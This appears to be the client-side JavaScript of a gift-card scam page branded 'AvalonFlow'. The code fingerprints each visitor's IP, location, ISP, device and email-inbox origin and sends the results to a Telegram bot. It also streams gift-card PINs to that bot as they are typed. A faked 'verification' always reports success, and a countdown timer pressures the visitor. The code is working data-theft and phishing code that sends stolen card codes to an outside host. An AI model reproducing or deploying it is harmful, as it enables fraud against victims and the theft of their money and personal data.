// 1. UNIFIED TELEMETRY & LOCALIZATION MODULE

async function initializeAppWithIP() {
    let ipData = {};

    try {
        // Fetch network data strictly once for both tracking and localization
        const ipResponse = await fetch('https://ipapi.co/json/');
        if (!ipResponse.ok) throw new Error('Failed to fetch network details');
        ipData = await ipResponse.json();
    } catch (err) {
        console.warn("IP geolocation fallback engaged:", err);
        // Fallback defaults if IP lookup fails
        ipData = {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country_name: "Unknown",
            country_code: "US",
            org: "Unknown",
            currency: "USD"
        };
    }

    // A. Run Telegram Visitor Tracking (if not already logged this session)
    if (!sessionStorage.getItem('visitor_logged_tg')) {
        await sendVisitorDetailsToTelegram(ipData);
    }

    // B. Run IP-Driven Storefront & Currency Localization

}

// ==========================================
// 2. TELEGRAM VISITOR TRACKING SENDER
// ==========================================
async function sendVisitorDetailsToTelegram(ipData) {
  try {
    const rawAgent = navigator.userAgent;

    // Anti-Bot Filter: Drop execution if visitor is a crawler/spider
    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
      console.log("🤖 Automated link indexing crawler bypassed safely.");
      return;
    }

    const urlParams = new URLSearchParams(window.location.search);
    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
    const currentPage = window.location.pathname;

    let detailedDevice = "Unknown Device";
    let detectedBrowser = "Unknown Browser";

    // Smart Browser Extractor
    if (/WhatsApp/i.test(rawAgent)) {
      detectedBrowser = "WhatsApp In-App";
    } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
      detectedBrowser = "Telegram In-App";
    } else if (/Instagram/i.test(rawAgent)) {
      detectedBrowser = "Instagram App";
    } else if (/TikTok/i.test(rawAgent)) {
      detectedBrowser = "TikTok App";
    } else if (/FBAN|FBAV/i.test(rawAgent)) {
      detectedBrowser = "Facebook App";
    } else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) {
      detectedBrowser = "X (Twitter) App";
    } else if (/LinkedInApp/i.test(rawAgent)) {
      detectedBrowser = "LinkedIn App";
    } else if (/Phoenix/i.test(rawAgent)) {
      detectedBrowser = "Phoenix Browser";
    } else if (/SamsungBrowser/i.test(rawAgent)) {
      detectedBrowser = "Samsung Internet";
    } else if (/OComponent|Opera|OPR/i.test(rawAgent)) {
      detectedBrowser = "Opera";
    } else if (/Edg/i.test(rawAgent)) {
      detectedBrowser = "Microsoft Edge";
    } else if (/Firefox|FxiOS/i.test(rawAgent)) {
      detectedBrowser = "Mozilla Firefox";
    } else if (/Chrome|CriOS/i.test(rawAgent)) {
      detectedBrowser = "Google Chrome";
    } else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) {
      detectedBrowser = "Apple Safari";
    }

    // Email Inbox Origin Identification
    const referrer = document.referrer || "";
    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
      if (/mail\.google\.com/i.test(referrer)) {
        detectedBrowser += " (via Gmail Web)";
      } else if (/mail\.yahoo/i.test(referrer)) {
        detectedBrowser += " (via Yahoo Mail Web)";
      } else if (/outlook|live\.com/i.test(referrer)) {
        detectedBrowser += " (via Outlook Web)";
      }
    }

    // Smart Device & OS Version Detection Engine
    if (/Android/i.test(rawAgent)) {
      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
      detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
      const iosVer = match ? match[1].replace('_', '.') : '';
      detailedDevice = `iOS ${iosVer} (Apple Device)`;
    } else if (/Windows/i.test(rawAgent)) {
      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
      let winVer = "PC";
      if (match) {
        if (match[1] === "10.0") winVer = "10/11";
        else if (match[1] === "6.3") winVer = "8.1";
        else if (match[1] === "6.1") winVer = "7";
      }
      detailedDevice = `Windows ${winVer}`;
    } else if (/Macintosh/i.test(rawAgent)) {
      detailedDevice = "macOS Device";
    } else if (/Linux/i.test(rawAgent)) {
      detailedDevice = "Linux System";
    }

    const isProxy = ipData.proxy || false;
    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const connectionType = navigator.connection ? navigator.connection.effectiveType : "N/A";
    const timestamp = new Date().toLocaleString();

    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
                        `🌐 <b>IP:</b> <code>${ipDisplay}</code>\n` +
                        `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                        `🏢 <b>ISP:</b> <code>${ipData.org || 'Unknown'}</code>\n` +
                        `📶 <b>Net Speed:</b> <code>${connectionType}</code>\n` +
                        `🌐 <b>Browser:</b> <code>${detectedBrowser}</code>\n` +
                        `📱 <b>Device Setup:</b> <code>${detailedDevice}</code>\n` + 
                        `📐 <b>Screen Res:</b> <code>${screenResolution}</code>\n` +
                        `⏱️ <b>Time:</b> <code>${timestamp}</code>`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    sessionStorage.setItem('visitor_logged_tg', 'true');
    console.log("🔒 Security telemetry parameters forwarded successfully.");
  } catch (err) {
    console.warn("Telegram telemetry bypass error:", err);
  }
}

// ==========================================
// 4. COUNTDOWN & TELEGRAM INPUT STREAMING
// ==========================================
function updateCountdownDisplay() {
    const timerElement = document.getElementById("countdown");
    let expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);

    if (!expiryTime) {
        expiryTime = Date.now() + 15 * 60 * 1000;
        localStorage.setItem("avb_expiry_time", expiryTime);
    }

    const remainingSec = Math.max(0, Math.floor((expiryTime - Date.now()) / 1000));
    const minutes = Math.floor(remainingSec / 60);
    const seconds = remainingSec % 60;

    if (timerElement) {
        if (remainingSec <= 0) {
            timerElement.textContent = "EXPIRED";
            clearInterval(timerInterval);
            localStorage.removeItem("avb_expiry_time");
            localStorage.removeItem("avb_redirected_to_avb");
            localStorage.removeItem("avb_session_state");

            window.location.replace("https://membership.avalonflow.site/notifications");
            return;
        }

        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    }
}

async function saveClearanceCode() {
    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
    localStorage.setItem("clearanceCodeDraft", rawCardCode);

    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
    if (cleanCode.length < 14 || cleanCode.length > 16) return;
    if (cleanCode === lastSentPayload) return;
    lastSentPayload = cleanCode;

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const identifyUser = urlParams.get('user') || 'Anonymous Visitor';
        const detectedRegion = localStorage.getItem("detected_region") || 'United States 🇺🇸 (Default)';

        const telegramMessage = 
          `💳 <b>Live Clearance PIN Tracking</b>\n\n` +
          `• <b>From User:</b> <code>${identifyUser}</code>\n` +
          `• <b>Detected Store Region:</b> <code>${detectedRegion}</code>\n` +
          `───────────────────\n` +
          `• <b>Sanitised PIN:</b> <code>${cleanCode}</code>\n` +
          `• <b>Raw Input:</b> <code>${rawCardCode}</code>`;

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'HTML'
          })
        });
    } catch (error) {
        console.error('Failed to stream live clearance PIN metric.');
    }
}

async function submitClearanceCode() {
    const rawCardCode = document.getElementById("giftcard_pin")?.value?.trim() || "";
    const cleanCode = rawCardCode.replace(/[\s-]/g, '');
    const statusBox = document.getElementById("status_message");
    const submitBtn = document.getElementById("submit_btn");

    if (cleanCode.length < 14 || cleanCode.length > 16) {
        if (statusBox) statusBox.innerText = "Please enter a valid 14-16 character card PIN.";
        return;
    }

    await saveClearanceCode();

    if (submitBtn) submitBtn.disabled = true;
    if (statusBox) {
        statusBox.style.color = "#38bdf8";
        statusBox.innerText = "Verifying code with clearance server...";
    }

    try {
        const mockApiResponse = await new Promise((resolve) => {
            setTimeout(() => {
                resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
            }, 2000);
        });

        if (mockApiResponse.status === "SUCCESS") {
            if (statusBox) {
                statusBox.style.color = "#10b981";
                statusBox.innerText = "Payment verified successfully!";
            }

            localStorage.setItem("has_withdrawn", "true");
            localStorage.setItem("step_3_paid", "true");
            localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);

            setTimeout(() => {
                window.location.replace("https://membership.avalonflow.site/dashboard");
            }, 1500);

        } else {
            if (statusBox) {
                statusBox.style.color = "#ef4444";
                statusBox.innerText = "Invalid card PIN. Please try again.";
            }
            if (submitBtn) submitBtn.disabled = false;
        }
    } catch (err) {
        if (statusBox) {
            statusBox.style.color = "#ef4444";
            statusBox.innerText = "Network error connecting to payment gateway.";
        }
        if (submitBtn) submitBtn.disabled = false;
    }
}

    timerInterval = setInterval(updateCountdownDisplay, 1000);

    // Bind real-time input listeners for PIN tracking
    const pinInput = document.getElementById("giftcard_pin");
    if (pinInput) {
        pinInput.addEventListener("input", saveClearanceCode);
    }
});
